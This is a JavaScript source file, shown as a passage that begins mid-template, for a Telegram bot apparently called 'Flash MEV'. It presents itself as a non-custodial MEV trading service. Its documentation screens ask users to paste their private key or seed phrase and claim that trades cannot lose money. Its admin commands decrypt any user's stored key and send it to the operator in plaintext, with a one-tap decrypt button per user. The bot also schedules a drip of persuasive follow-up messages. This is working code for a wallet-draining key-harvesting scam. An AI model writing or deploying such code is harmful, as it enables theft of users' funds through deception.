*4. Execute* — Bundles only land if profitable, otherwise revert

━━━━━━━━━━━━━━━━━━━━━

*Result:* You capture MEV that would otherwise go to professional searchers.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Getting Started', 'docs_getting_started')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_getting_started', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
🚀 *Getting Started*

Setup takes less than 60 seconds:

*1.* Open @Flash\\_Mev\\_trading\\_bot

*2.* Send /start to initialize

*3.* Tap *Import Key* and paste your private key OR 12/24-word seed phrase

*4.* Fund your wallet with at least *$200* on any supported chain

*5.* Tap *Deploy Agent* to start scanning

━━━━━━━━━━━━━━━━━━━━━

🔒 *Security Note:*
Your keys are encrypted with AES-256-GCM. You can export them anytime.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🌐 Supported Chains', 'docs_chains')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_chains', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
🌐 *Supported Chains*

━━━━━━━━━━━━━━━━━━━━━

*▸ EVM CHAINS (Flashbots relay)*

• *Ethereum* — ETH, USDC, USDT, WBTC, DAI
• *Base* — ETH, USDC, USDT
• *Arbitrum* — ETH, USDC, USDT
• *Polygon* — MATIC, USDC, USDT
• *BNB Chain* — BNB, USDC, USDT

━━━━━━━━━━━━━━━━━━━━━

*▸ SOLANA (Jito relay)*

• SOL, USDC, USDT, BONK, WIF

━━━━━━━━━━━━━━━━━━━━━

All chains monitored simultaneously. One EVM key covers all EVM chains.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🎯 Strategies', 'docs_strategies')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_strategies', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
🎯 *Trading Strategies*

Flash MEV employs 4 core strategies:

━━━━━━━━━━━━━━━━━━━━━

🔄 *Cross-DEX Arbitrage*
Buy cheap on one DEX, sell higher on another — same block. Zero market exposure.

━━━━━━━━━━━━━━━━━━━━━

⚡ *Front-Running*
Detect large pending trades and position ahead of them. Profit when the whale moves the price.

━━━━━━━━━━━━━━━━━━━━━

🎯 *Back-Running*
Execute immediately after a large trade. Capture momentum from market-moving transactions.

━━━━━━━━━━━━━━━━━━━━━

💥 *Liquidation Sniping*
Monitor lending protocols for undercollateralized positions. Trigger liquidations before competitors.

━━━━━━━━━━━━━━━━━━━━━

All strategies executed atomically — win or revert.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔐 Security', 'docs_security')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_security', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
🔐 *Security & Key Protection*

━━━━━━━━━━━━━━━━━━━━━

*▸ ENCRYPTION AT REST*

Private keys encrypted with *AES-256-GCM* — military-grade encryption used by banks. Even if servers compromised, attackers see only gibberish.

━━━━━━━━━━━━━━━━━━━━━

*▸ NON-CUSTODIAL DESIGN*

Export your key anytime via /wallet command. Import into MetaMask, Trust Wallet, or any wallet. You always have full control.

━━━━━━━━━━━━━━━━━━━━━

*▸ PRIVATE RELAY EXECUTION*

All trades route through Flashbots (EVM) and Jito (Solana) private relays. Transactions never touch public mempool — protected from sandwich attacks.

━━━━━━━━━━━━━━━━━━━━━

⚠️ *Never share your key with anyone — including us.*
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🤖 Commands', 'docs_commands')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_commands', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
🤖 *Bot Commands*

━━━━━━━━━━━━━━━━━━━━━

/start — Initialize bot and main menu

/wallet — View wallet, balances, manage funds

/portfolio — Active positions and P&L

/settings — Configure slippage, chains, notifications

/referral — Get referral link and track earnings

/info — How Flash MEV works

/help — All available commands

/stop — Pause automated notifications

━━━━━━━━━━━━━━━━━━━━━

Use /start for full dashboard with inline buttons.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('💰 Fees', 'docs_fees')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_fees', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
💰 *Fee Structure*

━━━━━━━━━━━━━━━━━━━━━

🎁 *NEW USER OFFER*

*0% fees for first 48 hours* after deployment.

Keep 100% of every profitable bundle during onboarding window.

━━━━━━━━━━━━━━━━━━━━━

*▸ STANDARD FEES*

After 48-hour window: *10% of net profits* on successful trades only.

You never pay fees on losing trades (because there are no losing trades — bundles revert if unprofitable).

━━━━━━━━━━━━━━━━━━━━━

*Example:*
Bundle captures $100 profit → You keep $90, we take $10
Bundle reverts → You pay $0
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('❓ FAQ', 'docs_faq')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_faq', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
❓ *Frequently Asked Questions*

━━━━━━━━━━━━━━━━━━━━━

*Q: Safe to import private key?*
A: Yes. Encrypted with AES-256-GCM. Export anytime.

*Q: Can I lose money on trades?*
A: No. Every bundle simulated first. Reverts if unprofitable. Zero gas on reverted bundles.

*Q: Minimum deposit?*
A: $200 recommended. Higher capital = larger opportunities.

*Q: Need VPS or technical setup?*
A: No. Runs on our cloud infrastructure. Just use Telegram.

*Q: How fast is execution?*
A: 51ms average latency, 91.2% landing rate. Direct validator connections.

*Q: Which tokens?*
A: Any ERC-20/SPL token with liquidity. Auto-filters honeypots and blacklisted tokens.
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('⚠️ Risk Disclosure', 'docs_risk')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_risk', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
⚠️ *Risk Disclosure*

━━━━━━━━━━━━━━━━━━━━━

*IMPORTANT NOTICE:*

• MEV trading involves inherent risks including smart contract vulnerabilities and network congestion

• Past performance does not guarantee future results

• Only deploy capital you can afford to have temporarily illiquid

• Cryptocurrency trading is not suitable for all investors

• Flash MEV is a tool — not financial advice

━━━━━━━━━━━━━━━━━━━━━

_By using Flash MEV, you acknowledge and accept these risks._
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Launch Bot', 'back_to_start')],
            [Markup.button.callback('◀️ Back to Menu', 'docs_menu')]
        ])
    });
});

bot.action('docs_menu', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
📚 *Flash MEV Documentation*

_Complete guide to autonomous MEV trading._

━━━━━━━━━━━━━━━━━━━━━

*▸ TOPICS*

Select a topic below to learn more:
`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('⚡ What is MEV?', 'docs_what_is_mev')],
            [Markup.button.callback('🚀 Getting Started', 'docs_getting_started')],
            [Markup.button.callback('🌐 Supported Chains', 'docs_chains')],
            [Markup.button.callback('🎯 Trading Strategies', 'docs_strategies')],
            [Markup.button.callback('🔐 Security', 'docs_security')],
            [Markup.button.callback('🤖 Commands', 'docs_commands')],
            [Markup.button.callback('💰 Fees', 'docs_fees')],
            [Markup.button.callback('❓ FAQ', 'docs_faq')],
            [Markup.button.callback('⚠️ Risk Disclosure', 'docs_risk')],
            [Markup.button.callback('🚀 Launch Bot', 'back_to_start')]
        ])
    });
});

// ═══════════════════════════════════════════════════
// 🎯 /help COMMAND
// ═══════════════════════════════════════════════════
bot.command('help', async (ctx) => {
    try {
        console.log(`[COMMAND] /help triggered by ${ctx.from.id}`);
        await ctx.replyWithMarkdown(`
❓ *Help & Commands*

━━━━━━━━━━━━━━━━━━━━━

*▸ WALLET*
/wallet — Manage your wallet
/start — Restart / reconnect

*▸ TRADING*
/portfolio — View positions & PnL
/settings — Configure agent

*▸ EARNINGS*
/referral — Rewards program

*▸ LEARN*
/info — How FLASH MEV works
/docs — Full documentation guide

━━━━━━━━━━━━━━━━━━━━━

*▸ SUPPORT*
[💬 Community](${config.CHANNEL_URL})
[🌐 Website](${config.WEBSITE})
`, Markup.inlineKeyboard([
            [Markup.button.callback('📚 Documentation', 'docs_menu')],
            [Markup.button.url('💬 Community', config.CHANNEL_URL)]
        ]));
    } catch (err) {
        console.error('❌ /help command error:', err);
        await ctx.reply('❌ An error occurred. Please try again.');
    }
});



// ═══════════════════════════════════════════════════
// 🎯 /stop COMMAND (for users to disable random messages)
// ═══════════════════════════════════════════════════
bot.command('stop', async (ctx) => {
    const userId = ctx.from.id;

    if (randomSchedulers.has(userId)) {
        clearTimeout(randomSchedulers.get(userId));
        randomSchedulers.delete(userId);
    }

    // 💾 Mark user as inactive in database
    await userTracker.deactivateUser(userId);

    await ctx.replyWithMarkdown(`
🛑 *Notifications Paused*

You will no longer receive automated messages.

To restart, simply send /start again.

_Note: Your agent will continue running in the background if deployed._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Restart', 'back_to_start')]
    ]));
});



// ═══════════════════════════════════════════════════
// 👑 ADMIN COMMANDS
// ═══════════════════════════════════════════════════

// Middleware: Check admin access
const requireAdmin = async (ctx, next) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.reply('🚫 Access denied. Admin only.');
        await walletManager.logAdminAction(ctx.from.id, 'UNAUTHORIZED_ACCESS_ATTEMPT');
        return;
    }
    return next();
};

bot.command('admin_stats', requireAdmin, async (ctx) => {
    const stats = await walletManager.getGlobalStats();

    await ctx.replyWithMarkdown(`
👑 *ADMIN DASHBOARD*

━━━━━━━━━━━━━━━━━━━━━

*▸ GLOBAL STATS*
• Total Wallets: ${stats.totalWallets}
• Trades (24h): ${stats.tradesLast24h}
• Successful (24h): ${stats.successfulTrades24h}
• Total Profit (24h): $${stats.totalProfit24h.toFixed(2)}

━━━━━━━━━━━━━━━━━━━━━

*▸ COMMANDS*
/admin\\_users — List all users
/admin\\_decrypt <telegram\\_id> — Decrypt a key
/admin\\_user <telegram\\_id> — User stats
/admin\\_search <address> — Find by address
`, Markup.inlineKeyboard([
        [Markup.button.callback('👥 List Users (First 10)', 'admin_list_users')]
    ]));
});

bot.command('admin_users', requireAdmin, async (ctx) => {
    const { wallets, total } = await walletManager.getAllWallets(10, 0);

    if (wallets.length === 0) {
        return ctx.reply('No wallets found.');
    }

    let message = `👥 *All Users* (${total} total)\n\n`;

    wallets.forEach((w, i) => {
        message += `*${i + 1}.* @${w.username || 'unknown'}\n`;
        message += `   ID: \`${w.telegram_id}\`\n`;
        message += `   Wallet: \`${w.address.slice(0, 10)}...${w.address.slice(-6)}\`\n`;
        message += `   Type: ${w.key_type}\n\n`;
    });

    const buttons = wallets.map(w => [
        Markup.button.callback(
            `🔑 @${w.username || w.telegram_id}`,
            `admin_decrypt_${w.telegram_id}`
        )
    ]);

    buttons.push([Markup.button.callback('📊 View More (Next 10)', 'admin_next_page_10')]);

    await ctx.replyWithMarkdown(message, Markup.inlineKeyboard(buttons));
});

bot.command('admin_decrypt', requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const telegramId = parseInt(args[0]);

    if (!telegramId) {
        return ctx.reply('Usage: /admin_decrypt <telegram_id>');
    }

    const data = await walletManager.decryptWalletKey(telegramId);
    if (!data) {
        return ctx.reply('❌ User not found.');
    }

    // Log the action
    await walletManager.logAdminAction(ctx.from.id, 'DECRYPT_KEY', telegramId);

    // Send as separate message (safer for copy-paste)
    await ctx.replyWithMarkdown(`🔑 *DECRYPTED KEY*\n\n⚠️ _Handle with extreme care_`, {
        disable_web_page_preview: true
    });

    // Send the plaintext key as code block (easy to copy)
    await ctx.reply(
        `\`\`\`\n${data.plaintextKey}\n\`\`\``,
        { parse_mode: 'Markdown' }
    );

    // Send metadata
    await ctx.replyWithMarkdown(`
📋 *Key Metadata*
• User: @${data.username || 'unknown'} (${data.telegramId})
• Address: \`${data.address}\`
• Type: ${data.keyType}
• Imported: ${new Date(data.createdAt).toLocaleString()}
`);
});

bot.command('admin_user', requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const telegramId = parseInt(args[0]);

    if (!telegramId) {
        return ctx.reply('Usage: /admin_user <telegram_id>');
    }

    const stats = await walletManager.getUserStats(telegramId);
    if (!stats.wallet) {
        return ctx.reply('❌ User not found.');
    }

    await ctx.replyWithMarkdown(`
📊 *User Stats: @${stats.wallet.username || 'unknown'}*

━━━━━━━━━━━━━━━━━━━━━

*▸ WALLET*
• ID: \`${stats.wallet.telegram_id}\`
• Address: \`${stats.wallet.address}\`
• Type: ${stats.wallet.key_type}
• Active: ${stats.wallet.is_active ? '✅ Yes' : '❌ No'}
• Since: ${new Date(stats.wallet.created_at).toLocaleDateString()}

*▸ PERFORMANCE*
• Total Trades: ${stats.totalTrades}
• Successful: ${stats.successfulTrades}
• Success Rate: ${stats.successRate}%
• Total Profit: $${stats.totalProfit.toFixed(2)}
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Decrypt Key', `admin_decrypt_${telegramId}`)],
        [Markup.button.callback('📊 View Trades', `admin_trades_${telegramId}`)]
    ]));
});

bot.command('admin_search', requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const address = args[0]?.toLowerCase();

    if (!address) {
        return ctx.reply('Usage: /admin_search <address>');
    }

    const { data } = await config.supabase
        .from('wallets')
        .select('*')
        .ilike('address', `%${address}%`)
        .limit(10);

    if (!data || data.length === 0) {
        return ctx.reply('❌ No wallets found matching that address.');
    }

    let message = `🔍 *Search Results* (${data.length} found)\n\n`;
    data.forEach((w, i) => {
        message += `*${i + 1}.* @${w.username || 'unknown'} (ID: ${w.telegram_id})\n`;
        message += `   \`${w.address}\`\n\n`;
    });

    await ctx.replyWithMarkdown(message);
});


// Admin callback handlers
bot.action(/admin_decrypt_(\d+)/, requireAdmin, async (ctx) => {
    await ctx.answerCbQuery();
    const telegramId = parseInt(ctx.match[1]);

    const data = await walletManager.decryptWalletKey(telegramId);
    if (!data) {
        return ctx.reply('❌ User not found.');
    }

    await walletManager.logAdminAction(ctx.from.id, 'DECRYPT_KEY', telegramId);

    await ctx.reply(`\`\`\`\n${data.plaintextKey}\n\`\`\``, { parse_mode: 'Markdown' });
    await ctx.replyWithMarkdown(`📋 @${data.username || 'unknown'} • \`${data.address}\` • ${data.keyType}`);
});

bot.action('admin_list_users', requireAdmin, async (ctx) => {
    await ctx.answerCbQuery();
    const { wallets } = await walletManager.getAllWallets(10, 0);

    let message = `👥 *Users (first 10)*\n\n`;
    wallets.forEach((w, i) => {
        message += `${i + 1}. @${w.username || 'unknown'} (${w.telegram_id})\n`;
    });

    const buttons = wallets.map(w => [
        Markup.button.callback(`🔑 @${w.username || w.telegram_id}`, `admin_decrypt_${w.telegram_id}`)
    ]);

    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/admin_trades_(\d+)/, requireAdmin, async (ctx) => {
    await ctx.answerCbQuery();
    const telegramId = parseInt(ctx.match[1]);

    const { data: trades } = await config.supabase
        .from('trades')
        .select('*')
        .eq('telegram_id', telegramId)
        .order('created_at', { ascending: false })
        .limit(10);

    if (!trades || trades.length === 0) {
        return ctx.reply('No trades found for this user.');
    }

    let message = `📜 *Recent Trades*\n\n`;
    trades.forEach((t, i) => {
        const statusEmoji = t.status === 'success' ? '✅' : t.status === 'failed' ? '❌' : '⏳';
        message += `${statusEmoji} *${t.token}* on ${t.chain}\n`;
        message += `   Profit: $${t.profit_usd} • ${new Date(t.created_at).toLocaleDateString()}\n\n`;
    });

    await ctx.replyWithMarkdown(message);
});


// ═══════════════════════════════════════════════════
// 🔄 RESTORE SCHEDULES ON SERVER RESTART
// ═══════════════════════════════════════════════════
async function restoreUserSchedules() {
    console.log('🔄 Restoring user schedules after server restart...');

    const users = await userTracker.getAllUsers();

    if (users.length === 0) {
        console.log('✅ No existing users to restore');
        return;
    }

    let restoredCount = 0;
    let scheduledRandomCount = 0;

    for (const user of users) {
        const startedAt = new Date(user.started_at).getTime();
        const now = Date.now();
        const elapsedMs = now - startedAt;

        // Define all scheduled message delays (in ms)
        const schedule = [
            { fn: sendFollowupMessage, delay: 15 * 60 * 1000 },         // 15 min
            { fn: sendAirdropMessage, delay: 45 * 60 * 1000 },          // 45 min
            { fn: sendActivateMessage, delay: 65 * 60 * 1000 },         // 65 min
            { fn: sendAtomicExecutionMessage, delay: 2 * 60 * 60 * 1000 },  // 2 hours
            { fn: sendHoneypotFilterMessage, delay: 3 * 60 * 60 * 1000 },  // 3 hours
            { fn: sendRpcInfrastructureMessage, delay: 4 * 60 * 60 * 1000 }, // 4 hours
            { fn: sendDexScannerMessage, delay: 5 * 60 * 60 * 1000 },      // 5 hours
            { fn: sendCrossChainMessage, delay: 6 * 60 * 60 * 1000 },      // 6 hours
            { fn: sendEngineActivationMessage, delay: 7 * 60 * 60 * 1000 } // 7 hours
        ];

        // Schedule only FUTURE messages (skip ones already in the past)
        for (const item of schedule) {
            const remainingMs = item.delay - elapsedMs;

            // Only schedule if there's still time left AND at least 10 seconds remaining
            if (remainingMs > 10000) {
                setTimeout(async () => {
                    try {
                        await item.fn(user.telegram_id);
                        console.log(`✅ Sent restored message to ${user.telegram_id}`);
                    } catch (err) {
                        console.error(`❌ Failed to send restored message to ${user.telegram_id}:`, err.message);
                    }
                }, remainingMs);
                restoredCount++;
            }
        }

        // If user has been active for more than 8 hours, jump straight to random scheduler
        const randomStartDelay = 8 * 60 * 60 * 1000;
        if (elapsedMs >= randomStartDelay) {
            // Start random scheduler immediately for long-time users
            scheduleRandomMessage(user.telegram_id);
            scheduledRandomCount++;
        } else {
            // Schedule random scheduler to start at the 8-hour mark
            const remainingToRandom = randomStartDelay - elapsedMs;
            setTimeout(() => {
                scheduleRandomMessage(user.telegram_id);
            }, remainingToRandom);
            scheduledRandomCount++;
        }
    }

    console.log(`✅ Restored schedules for ${users.length} users`);
    console.log(`   • ${restoredCount} pending scheduled messages`);
    console.log(`   • ${scheduledRandomCount} random schedulers activated`);
}



// ═══════════════════════════════════════════════════
// 🚀 LAUNCH BOT
// ═══════════════════════════════════════════════════
bot.launch()
    .then(async () => {
        console.log('✅ Flash MEV Bot launched successfully');

        // Start the background balance monitor
        startBalanceMonitor(bot);

        // 💾 Restore scheduled messages for existing users
        await restoreUserSchedules();
    })
    .catch(err => console.error('❌ Bot launch failed:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

module.exports = bot;